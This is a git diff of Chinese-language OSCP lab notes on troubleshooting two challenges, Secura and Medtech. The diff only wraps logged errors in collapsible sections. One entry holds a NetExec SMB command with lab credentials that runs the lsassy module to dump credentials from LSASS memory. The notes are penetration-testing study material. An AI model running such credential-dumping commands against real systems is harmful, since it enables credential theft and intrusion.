@@ -1,6 +1,9 @@
 ## 遇到的问题
 -------------------------------------------------------
 ### Challenge 0 - Secura
+<details>
+<summary>$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy</summary>
+  
 ```
 ┌──(syareya55㉿kali)-[~]
 └─$ nxc smb 192.168.238.95 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy --no-smb
@@ -10,10 +13,16 @@ SMB         192.168.238.95  445    SECURE           [+] secura.yzx\Eric.Wallows:
                     target 192.168.238.95: [Errno 32]                        
                     Broken pipe
 ```
+
+</details>
+
 #### 解决的方式是：在OSCP官方的MyKali上运作
 -------------------------------------------------------
 
 ### Challenge 1 - Medtech
+<details>
+<summary>C:\Users\Administrator\Desktop>net user /domain</summary>
+  
 ```
 C:\Users\Administrator\Desktop>net user /domain
 net user /domain
@@ -23,5 +32,8 @@ System error 1355 has occurred.
 
 The specified domain either does not exist or could not be contacted.
 ```
+
+</details>
+
 #### 解决的方式是：换个靶机打
 -------------------------------------------------------
